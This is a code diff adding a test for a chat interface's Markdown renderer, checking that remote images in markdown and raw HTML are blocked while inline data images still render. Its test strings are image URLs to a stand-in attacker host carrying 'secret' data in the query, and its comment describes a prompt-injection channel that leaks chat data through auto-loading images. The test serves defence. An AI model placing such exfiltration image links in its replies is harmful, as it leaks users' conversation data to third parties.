@@ -41,6 +41,25 @@ describe('Markdown', () => {
 		}
 	});
 
+	// A remote image would load as soon as the reply renders: a zero-click
+	// channel for a prompt injection to leak chat data in the URL.
+	it('blocks remote images in markdown and raw HTML', async () => {
+		const content = [
+			'![leak](https://evil.example/a.png?d=secret)',
+			'',
+			'![proto](//evil.example/b.png)',
+			'',
+			'<p><img src="https://evil.example/c.png?d=secret" alt="raw"></p>',
+			'',
+			'![inline](data:image/gif;base64,R0lGODlhAQABAAAAACw=)'
+		].join('\n');
+		const screen = render(Markdown, { content, streaming: false });
+		await expect.poll(() => screen.container.querySelector('img[alt="inline"]')).not.toBeNull();
+		const sources = [...screen.container.querySelectorAll('img')].map((img) => img.src);
+		expect(sources.some((src) => src.includes('evil.example'))).toBe(false);
+		expect(screen.container.textContent).toContain('Image blocked: leak');
+	});
+
 	it('renders math with KaTeX', async () => {
 		const screen = render(Markdown, { content: '$$x^2$$', streaming: false });
 		await expect.poll(() => screen.container.querySelector('.katex')).not.toBeNull();
